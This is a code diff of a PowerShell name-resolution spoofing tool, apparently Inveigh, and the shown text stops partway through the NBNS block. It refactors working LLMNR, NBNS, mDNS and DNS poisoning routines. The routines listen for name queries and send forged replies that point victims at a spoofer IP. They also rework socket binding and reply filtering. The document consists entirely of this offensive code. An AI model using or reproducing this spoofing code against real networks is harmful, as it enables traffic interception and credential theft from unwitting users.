-                                    $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS"
-                                    $NBNS_response_type = $NBNS_response_message[0]
-                                    $NBNS_response_message = $NBNS_response_message[1]
+                                    $NBNS_request_ignore = $true
                                 }
-
+                                
+                            }
+                            else
+                            {
+                                
+                                if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
+                                {
+                                    $NBNS_request_ignore = $true
+                                }
+                                
                             }
 
                             if(!$NBNS_request_ignore -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
@@ -4702,27 +4755,18 @@ $sniffer_scriptblock =
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                     $mDNS_response_data
                             
-                            if($mDNS -eq 'Y')
-                            {
 
-                                if((!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (
-                                !$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-                                $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($mDNSTypes -contains 'QU'))
-                                {
-                                    $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
-                                    $send_socket.SendBufferSize = 1024
-                                    $destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
-                                    $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
-                                    $send_socket.Close()
-                                    $mDNS_response_message = "[response sent]"
-                                }
-                                else
-                                {
-                                    $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU"
-                                    $mDNS_response_type = $mDNS_response_message[0]
-                                    $mDNS_response_message = $mDNS_response_message[1]
-                                }
+                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU" -Enabled $mDNS
+                            $mDNS_response_type = $mDNS_response_message[0]
+                            $mDNS_response_message = $mDNS_response_message[1]
                             
+                            if($mDNS_response_message -eq '[response sent]')
+                            {
+                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
+                                $send_socket.SendBufferSize = 1024
+                                $destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
+                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
+                                $send_socket.Close()
                             }
 
                             $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
@@ -4751,27 +4795,17 @@ $sniffer_scriptblock =
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                     $mDNS_response_data
                    
-                            if($mDNS -eq 'Y')
-                            {
-
-                                if((!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (
-                                !$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-                                $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($mDNSTypes -contains 'QM'))
-                                {
-                                    $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                    $send_socket.SendBufferSize = 1024
-                                    $destination_point = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
-                                    $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
-                                    $send_socket.Close()
-                                    $mDNS_response_message = "[response sent]"
-                                }
-                                else
-                                {
-                                    $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM"
-                                    $mDNS_response_type = $mDNS_response_message[0]
-                                    $mDNS_response_message = $mDNS_response_message[1]
-                                }
+                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM" -Enabled $mDNS
+                            $mDNS_response_type = $mDNS_response_message[0]
+                            $mDNS_response_message = $mDNS_response_message[1]
                             
+                            if($mDNS_response_message -eq '[response sent]')
+                            {
+                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                $send_socket.SendBufferSize = 1024
+                                $destination_point = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
+                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
+                                $send_socket.Close()
                             }
 
                             $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
@@ -4816,86 +4850,73 @@ $sniffer_scriptblock =
 
                             $LLMNR_request_ignore = $false
                 
-                            if($LLMNR -eq 'Y')
+                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                             {
 
-                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
+                                if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
                                 {
+                                    $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like "20* $LLMNR_query_string"}).SubString(0,19)
 
-                                    if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
+                                    if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                     {
-                                        $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like "20* $LLMNR_query_string"}).SubString(0,19)
-
-                                        if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))
-                                        {
-                                            $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like "20* $LLMNR_query_string"}))
-                                            $LLMNR_learning_send = $true
-                                        }
-                                        else
-                                        {
-                                            $LLMNR_learning_send = $false
-                                        }
-
-                                    }
-                                    else
-                                    {           
+                                        $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like "20* $LLMNR_query_string"}))
                                         $LLMNR_learning_send = $true
                                     }
-                                    
-                                    if($LLMNR_learning_send)
-                                    {
-                                        $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
-                                        $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                                        $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace " ","-"
-                                        $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient
-                                        $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]
-
-                                        $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +
-                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
-                                                                ($LLMNR_hostname_bytes.Length - 1) +
-                                                                $LLMNR_hostname_bytes +
-                                                                0x00,0x01,0x00,0x01
-
-                                        $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
-                                        $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
-                                        $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
-                                        $LLMNR_UDP_client.Close()
-                                        $LLMNR_learning_log.Add("$(Get-Date -format s) $LLMNR_transaction_ID $LLMNR_query_string") > $null
-                                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $LLMNR_query_string sent to 224.0.0.252") > $null
-                                    }
-
-                                }
-
-                                if(($inveigh.valid_host_list -notcontains $LLMNR_query_string -or $SpooferHostsReply -contains $LLMNR_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
-                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
-                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and (
-                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)) -and (
-                                $EvadeRG -eq 'Y' -and $destination_IP.IPAddressToString -ne $IP) -and @($inveigh.request_table.$LLMNR_query_string | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -gt $SpooferThresholdHost -and @(
-                                $inveigh.request_table.$LLMNR_query_string | Sort-Object | Get-Unique).Count -gt $SpooferThresholdNetwork -and ($SpooferNonprintable -eq 'Y' -or ($SpooferNonprintable -eq 'N' -and $LLMNR_query_string -notmatch '[^\x00-\x7F]+')))
-                                {
-
-                                    if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
-                                    {
-                                        $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                        $LLMNR_send_socket.SendBufferSize = 1024
-                                        $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
-                                        $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point) > $null
-                                        $LLMNR_send_socket.Close()
-                                        $LLMNR_response_message = "[response sent]"
-                                    }
                                     else
                                     {
-                                        $LLMNR_request_ignore = $true
+                                        $LLMNR_learning_send = $false
                                     }
 
                                 }
                                 else
-                                {
-                                    $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR"
-                                    $LLMNR_response_type = $LLMNR_response_message[0]
-                                    $LLMNR_response_message = $LLMNR_response_message[1]
+                                {           
+                                    $LLMNR_learning_send = $true
                                 }
-                            
+                                
+                                if($LLMNR_learning_send)
+                                {
+                                    $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+                                    $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                                    $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace " ","-"
+                                    $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient
+                                    $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]
+
+                                    $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +
+                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
+                                                            ($LLMNR_hostname_bytes.Length - 1) +
+                                                            $LLMNR_hostname_bytes +
+                                                            0x00,0x01,0x00,0x01
+
+                                    $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
+                                    $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
+                                    $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
+                                    $LLMNR_UDP_client.Close()
+                                    $LLMNR_learning_log.Add("$(Get-Date -format s) $LLMNR_transaction_ID $LLMNR_query_string") > $null
+                                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $LLMNR_query_string sent to 224.0.0.252") > $null
+                                }
+
+                            }
+
+                            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR" -Enabled $LLMNR
+                            $LLMNR_response_type = $LLMNR_response_message[0]
+                            $LLMNR_response_message = $LLMNR_response_message[1]
+
+                            if($LLMNR_response_message -eq '[response sent]')
+                            {
+
+                                if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
+                                {
+                                    $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                    $LLMNR_send_socket.SendBufferSize = 1024
+                                    $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
+                                    $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point) > $null
+                                    $LLMNR_send_socket.Close()
+                                }
+                                else
+                                {
+                                    $LLMNR_request_ignore = $true
+                                }
+
                             }
                            
                             if(!$LLMNR_request_ignore)
@@ -4934,13 +4955,13 @@ $sniffer_scriptblock =
 
                 }
 
-                if($Pcap -and ($PcapPortUDP -contains $endpoint_source_port -or $PcapPortUDP -contains $destination_port -or $PcapPortUDP -contains 'All'))
+                if($Pcap -and ($PcapUDP -contains $endpoint_source_port -or $PcapUDP -contains $destination_port -or $PcapUDP -contains 'All'))
                 {
 
                     if($payload_bytes)
                     {
                         $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
-                        $pcap_length = [System.BitConverter]::GetBytes($total_length + 14)
+                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)
                         
                         $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + 
                             [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter
@@ -4948,7 +4969,7 @@ $sniffer_scriptblock =
                             $pcap_length +
                             (,0x00 * 12) +
                             0x08,0x00 +
-                            $byte_data[0..($total_length - 1)]
+                            $byte_data[0..($packet_length - 1)]
 
                         switch ($Pcap)
                         {
@@ -4995,7 +5016,7 @@ $sniffer_scriptblock =
 # Unprivileged DNS Spoofer ScriptBlock 
 $DNS_spoofer_scriptblock = 
 {
-    param ($Inspect,$DNSTTL,$DNS_response_message,$SpooferIP)
+    param ($Inspect,$DNSTTL,$SpooferIP)
 
     $DNS_running = $true
     $DNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)
@@ -5048,9 +5069,11 @@ $DNS_spoofer_scriptblock =
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
 
             $source_IP = $DNS_listener_endpoint.Address
-            $DNS_response_type = "[+]"
+            $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type "DNS" -Enabled $DNS
+            $DNS_response_type = $DNS_response_message[0]
+            $DNS_response_message = $DNS_response_message[1]
 
-            if(!$Inspect)
+            if($DNS_response_message -eq '[response sent]')
             {
                 $DNS_destination_endpoint = New-Object System.Net.IPEndpoint($DNS_listener_endpoint.Address,$DNS_listener_endpoint.Port)
                 $DNS_UDP_client.Connect($DNS_destination_endpoint)
@@ -5058,11 +5081,6 @@ $DNS_spoofer_scriptblock =
                 $DNS_UDP_client.Close()
                 $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
                 $DNS_UDP_client.Client.ReceiveTimeout = 5000
-                $DNS_response_message = "[response sent]"
-            }
-            else
-            {
-                $DNS_response_message = "[something went wrong]"
             }
            
             $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
@@ -5077,14 +5095,17 @@ $DNS_spoofer_scriptblock =
 # Unprivileged LLMNR Spoofer ScriptBlock 
 $LLMNR_spoofer_scriptblock = 
 {
-    param ($Inspect,$LLMNR_response_message,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)
+    param ($Inspect,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)
 
     $LLMNR_running = $true
     $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
 
     try
     {
-        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
+        $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
+        $LLMNR_UDP_client.ExclusiveAddressUse = $false
+        $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+        $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
     }
     catch
     {
@@ -5109,9 +5130,13 @@ $LLMNR_spoofer_scriptblock =
             $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint)
         }
         catch
-        {
+        {      
             $LLMNR_UDP_client.Close()
-            $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
+            $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
+            $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
+            $LLMNR_UDP_client.ExclusiveAddressUse = $false
+            $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+            $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
             $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
             $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
             $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
@@ -5143,23 +5168,23 @@ $LLMNR_spoofer_scriptblock =
                 $inveigh.request_table_updated = $true
             }
 
-            if(!$Inspect -and ($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
-            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP) -and ($SpooferNonprintable -eq 'Y' -or ($SpooferNonprintable -eq 'N' -and $LLMNR_query_string -notmatch '[^\x00-\x7F]+')))
+            $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR" -Enabled $LLMNR
+            $LLMNR_response_type = $LLMNR_response_message[0]
+            $LLMNR_response_message = $LLMNR_response_message[1]
+
+            if($LLMNR_response_message -eq '[response sent]')
             {
                 $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)
                 $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
                 $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
                 $LLMNR_UDP_client.Close()
-                $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
+                $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient
+                $LLMNR_UDP_client.ExclusiveAddressUse = $false
+                $LLMNR_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+                $LLMNR_UDP_client.Client.Bind($LLMNR_listener_endpoint)
                 $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
                 $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
                 $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
-                $LLMNR_response_message = "[response sent]"
-            }
-            else
-            {
-                $LLMNR_response_message = Get-SpooferResponseMessage -QueryString $LLMNR_query_string -Type "LLMNR"
             }
         
             if($LLMNR_request_data)
@@ -5172,20 +5197,25 @@ $LLMNR_spoofer_scriptblock =
 
     }
 
+    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
     $LLMNR_UDP_client.Close()
  }
 
 # Unprivileged mDNS Spoofer ScriptBlock 
 $mDNS_spoofer_scriptblock = 
 {
-    param ($Inspect,$mDNS_response_message,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)
+    param ($Inspect,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)
 
     $mDNS_running = $true
     $mDNS_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)
 
     try
     {
-        $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient 5353
+        $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
+        $mDNS_UDP_client.ExclusiveAddressUse = $false
+        $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+        $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)
+
     }
     catch
     {
@@ -5212,7 +5242,10 @@ $mDNS_spoofer_scriptblock =
         catch
         {
             $mDNS_UDP_client.Close()
-            $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
+            $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
+            $mDNS_UDP_client.ExclusiveAddressUse = $false
+            $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+            $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)
             $mDNS_multicast_group = [IPAddress]"224.0.0.251"
             $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
             $mDNS_UDP_client.Client.ReceiveTimeout = 5000
@@ -5232,26 +5265,24 @@ $mDNS_spoofer_scriptblock =
                                     $mDNS_TTL_bytes +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
+            
+            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU" -Enabled $mDNS
+            $mDNS_response_type = $mDNS_response_message[0]
+            $mDNS_response_message = $mDNS_response_message[1]
 
-            if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
-            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-            $mDNSTypes -contains 'QU') -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP))
+            if($mDNS_response_message -eq '[response sent]')
             {
                 $mDNS_destination_endpoint = New-Object Net.IPEndpoint($mDNS_listener_endpoint.Address,$mDNS_listener_endpoint.Port)
                 $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
                 $mDNS_UDP_client.Send($mDNS_response_packet,$mDNS_response_packet.Length)
                 $mDNS_UDP_client.Close()
-                $mDNS_UDP_client = new-Object System.Net.Sockets.UdpClient 5353
+                $mDNS_UDP_client = New-Object System.Net.Sockets.UdpClient
+                $mDNS_UDP_client.ExclusiveAddressUse = $false
+                $mDNS_UDP_client.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+                $mDNS_UDP_client.Client.Bind($mDNS_listener_endpoint)
                 $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                 $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                 $mDNS_UDP_client.Client.ReceiveTimeout = 5000
-                $mDNS_response_message = "[response sent]"
-            }
-            else
-            {
-                $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU"
-                $mDNS_response_type = $mDNS_response_message[0]
-                $mDNS_response_message = $mDNS_response_message[1]
             }
         
             if($mDNS_request_data)
@@ -5277,9 +5308,11 @@ $mDNS_spoofer_scriptblock =
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()        
                 
-            if(!$Inspect -and ($mDNS_request_data -and $mDNS_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (
-            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-            $mDNSTypes -contains 'QM') -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP))
+            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM" -Enabled $mDNS
+            $mDNS_response_type = $mDNS_response_message[0]
+            $mDNS_response_message = $mDNS_response_message[1]
+
+            if($mDNS_response_message -eq '[response sent]')
             {
                 $mDNS_destination_endpoint = New-Object Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                 $mDNS_UDP_client.Connect($mDNS_destination_endpoint)
@@ -5289,13 +5322,6 @@ $mDNS_spoofer_scriptblock =
                 $mDNS_multicast_group = [IPAddress]"224.0.0.251"
                 $mDNS_UDP_client.JoinMulticastGroup($mDNS_multicast_group)
                 $mDNS_UDP_client.Client.ReceiveTimeout = 5000
-                $mDNS_response_message = "[response sent]"
-            }
-            else
-            {
-                $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM"
-                $mDNS_response_type = $mDNS_response_message[0]
-                $mDNS_response_message = $mDNS_response_message[1]
             }
 
             if($mDNS_request_data)                   
@@ -5314,7 +5340,7 @@ $mDNS_spoofer_scriptblock =
 # Unprivileged NBNS Spoofer ScriptBlock
 $NBNS_spoofer_scriptblock = 
 {
-    param ($Inspect,$IP,$NBNS_response_message,$NBNSTTL,$NBNSTypes,$SpooferIP,$SpooferHostsIgnore,$SpooferHostsReply,
+    param ($Inspect,$IP,$NBNSTTL,$NBNSTypes,$SpooferIP,$SpooferHostsIgnore,$SpooferHostsReply,
         $SpooferIPsIgnore,$SpooferIPsReply,$SpooferNonprintable)
 
     $NBNS_running = $true
@@ -5367,11 +5393,13 @@ $NBNS_spoofer_scriptblock =
             $source_IP = $NBNS_listener_endpoint.Address
             $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])
             $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
+            $NBNS_type = $NBNS_request_data[47]
             $NBNS_response_type = "[+]"
             $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
             $NBNS_query = $NBNS_query -replace "-00",""
             $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
+            $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
             $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
             $NBNS_query_string_subtracted = $null
             $NBNS_query_string = $null
@@ -5394,6 +5422,13 @@ $NBNS_spoofer_scriptblock =
             }
             until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)
 
+            if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
+            {
+                $NBNS_query_string = $NBNS_query_string.Substring(2)
+                $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
+                $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
+            }
+
             if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
             {
 
@@ -5410,29 +5445,23 @@ $NBNS_spoofer_scriptblock =
 
             }
             
-            if(!$Inspect -and ($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
-            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
-            $inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP) -and ($NBNSTypes -contains $NBNS_query_type) -and ($source_IP -ne $IP) -and ($SpooferNonprintable -eq 'Y' -or (
-            $SpooferNonprintable -eq 'N' -and $NBNS_query_string -notmatch '[^\x00-\x7F]+')))
+            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
+            $NBNS_response_type = $NBNS_response_message[0]
+            $NBNS_response_message = $NBNS_response_message[1]
+
+            if($NBNS_response_message -eq '[response sent]')
             {
-                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,137)
+                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,$NBNS_listener_endpoint.Port)
